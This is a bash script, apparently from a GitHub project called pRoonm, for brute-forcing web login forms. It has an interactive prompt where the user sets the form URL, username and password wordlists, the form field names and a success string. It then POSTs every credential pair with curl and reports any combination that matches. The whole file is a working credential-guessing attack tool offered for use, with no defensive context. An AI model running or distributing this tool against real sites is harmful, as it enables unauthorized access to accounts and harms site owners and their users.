#!/bin/bash
#########################################################
#	       _____                  	        	#
#	      |  __ \                 	        	#
#	 _ __ | |__) |___   ___  _ __  _ __ ___    	#
#	| '_ \|  _  // _ \ / _ \| '_ \| '_ ` _ \   	#
#	| |_) | | \ \ (_) | (_) | | | | | | | | |  	#
#	| .__/|_|  \_\___/ \___/|_| |_|_| |_| |_|  	#
#	| |                                          	#
#	|_|                                          	#
#                                               	#
#                                __   _____		#
#                               /  | |  _  |           	#
#                        __   __`| | | |/' |           	#
#                        \ \ / / | | |  /| | 	       	#
#                         \ V / _| |_\ |_/ /           	#
#                          \_/  \___(_)___/            	#
#                                                      	#
#                             				#
# Coded by: rahul-joy     				#
# Github: https://github.com/rahul-joy/pRoonm           #
# Version: 1.0   			    		#
# License: MIT						#
#########################################################
#!/bin/bash

# Colors
BOLD_WHITE=$(tput bold; tput setaf 7)
BOLD_CYAN=$(tput bold; tput setaf 6)
BOLD_GREEN=$(tput bold; tput setaf 2)
BOLD_YELLOW=$(tput bold; tput setaf 3)
BOLD_RED=$(tput bold; tput setaf 1)
RESET=$(tput sgr0)

# Configuration
formUrl=''
opt=''
elems=0
config=0
_usrsList=''
_pwsList=''
_userField=''
_passField=''
ssMsgfile=''
successMsg=''
declare -a users
declare -a passwords

# Clear and resize terminal
clear
if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "win32" ]]; then
    mode con cols=200 lines=50
else
    printf '\e[8;30;110t'
fi

# Initial prompt
cat <<'EOF'

			       _____                  	        	
			      |  __ \                 	        	
			 _ __ | |__) |___   ___  _ __  _ __ ___    	
			| '_ \|  _  // _ \ / _ \| '_ \| '_ ` _ \   	
			| |_) | | \ \ (_) | (_) | | | | | | | | |  	
			| .__/|_|  \_\___/ \___/|_| |_|_| |_| |_|  	
			| |                                          	
			|_|                                                 
					8b           d8    88       ,a8888a,     
					`8b         d8'  ,d88     ,8P"'  `"Y8,   
					 `8b       d8' 888888    ,8P        Y8,  
					  `8b     d8'      88    88          88  
					   `8b   d8'       88    88          88  
					    `8b d8'        88    `8b        d8'  
					     `888'         88 888 `8ba,  ,ad8'   
					      `8'          88 888   "Y8888P" 

[+]Coded by rahul-joy[+]
|Github: https://github.com/rahuljoy/pRoonm
|Version:1.0
|License: MIT (You have to address my name in any redistributed copy)


EOF

# Main function
main() {
    echo "${BOLD_WHITE}Type \`help\` for help screen and \`start\` to start bruteforcing."
    while true; do
        echo -n "${BOLD_CYAN}pRoonm@rahul> ${BOLD_WHITE}"
        read cmd
        process_command "$cmd"
    done
}

# Command processor
process_command() {
    local cmd=$1
    local options=($cmd)
    local opt_count=${#options[@]}

    case ${options[0]} in
        clear)
            clear
            ;;
        exit)
            echo -e "\nBye!"
            exit 0
            ;;
        help)
            helpMsg
            ;;
        set)
            if [[ $opt_count -eq 3 ]]; then
                case ${options[1]} in
                    url)
                        formUrl=${options[2]}
                        echo "${BOLD_GREEN}[SUCCESS]${RESET} Form url has been successfully set to \`${formUrl}\`"
                        ;;
                    users)
                        _usrsList=${options[2]}
                        if [[ ! -e $_usrsList ]]; then
                            _usrsList=''
                            echo "${BOLD_RED}[ERROR]${RESET} File doesn't exist."
                        else
                            users=($(cat $_usrsList))
                            echo "${BOLD_GREEN}[SUCCESS]${RESET} Users List ==> ${_usrsList}"
                        fi
                        ;;
                    passwords)
                        _pwsList=${options[2]}
                        if [[ ! -e $_pwsList ]]; then
                            _pwsList=''
                            echo "${BOLD_RED}[ERROR]${RESET} File doesn't exist."
                        else
                            passwords=($(cat $_pwsList))
                            echo "${BOLD_GREEN}[SUCCESS]${RESET} Passwords List ==> ${_pwsList}"
                        fi
                        ;;
                    userField)
                        _userField=${options[2]}
                        echo "${BOLD_GREEN}[SUCCESS]${RESET} userField ==> ${_userField}"
                        ;;
                    passField)
                        _passField=${options[2]}
                        echo "${BOLD_GREEN}[SUCCESS]${RESET} passField ==> ${_passField}"
                        ;;
                    ssMsg)
                        ssMsgfile=${options[2]}
                        if [[ ! -e $ssMsgfile ]]; then
                            successMsg=''
                            echo "${BOLD_RED}[ERROR]${RESET} File doesn't exist."
                        else
                            successMsg=$(cat $ssMsgfile)
                            echo "${BOLD_GREEN}[SUCCESS]${RESET} Success message has been successfully updated."
                        fi
                        ;;
                    *)
                        echo "${BOLD_RED}[ERROR]${RESET} Unknown command."
                        ;;
                esac
            else
                echo "${BOLD_RED}[ERROR]${RESET} Unknown command."
            fi
            ;;
        start)
            if [[ -z $formUrl || -z $_usrsList || -z $_pwsList || -z $_userField || -z $_passField || -z $successMsg ]]; then
                echo "${BOLD_RED}[ERROR]${RESET} Please check your configuration. Type \`config\` to see the current values."
            else
                echo "Starting bruteforce..."
                bruteForce
            fi
            ;;
        config)
            config
            ;;
        *)
            echo "Unknown command."
            ;;
    esac
}

# Help message
helpMsg() {
    echo -e "${BOLD_WHITE}"
    cat <<EOF
    set url <value>         : Setting the form url to a new value
                              Example: set url http://www.example.com/form1.php
    set users <value>       : Give users list a new value
                              Example: set users users_list.txt
    set passwords <value>   : Give passwords list a new value
                              Example: set passwords passwords_list.txt
    set userField <value>   : Enter the value of the user field (as in the html source)
                              Example: set userField username
    set passField <value>   : Enter the value of the password field (as in the html source)
                              Example: set passField password
    set ssMsg <value>       : Setting the success string to test on
                              Example: set ssMsg success.txt
    start                   : Start bruteforcing
    help                    : Show this help message
EOF
    echo -e "${RESET}"
}

# Config display
config() {
    echo -e "${BOLD_WHITE}"
    cat <<EOF
Current Configuration:
    url       : $formUrl
    users     : $_usrsList
    passwords : $_pwsList
    userField : $_userField
    passField : $_passField
    ssMsg     : $ssMsgfile
EOF
    echo -e "${RESET}"
}

# Bruteforce function
bruteForce() {
    local stop=0
    for user in "${users[@]}"; do
        user=$(echo "$user" | tr -d '[:space:]')
        [[ $stop -eq 1 ]] && break

        for pass in "${passwords[@]}"; do
            pass=$(echo "$pass" | tr -d '[:space:]')
            [[ $stop -eq 1 ]] && break

            response=$(curl -s -d "$_userField=$user&$_passField=$pass" -X POST "$formUrl")
            if [[ $response == *"$successMsg"* ]]; then
                echo "${BOLD_YELLOW}[${BOLD_GREEN}SUCCESS${BOLD_YELLOW}]${RESET} $formUrl ==> $user:$pass"
                stop=1
            else
                echo "${BOLD_YELLOW}[${BOLD_RED}FAILURE${BOLD_YELLOW}]${RESET} $formUrl ==> $user:$pass"
            fi
        done
    done
}

# Run main function
main

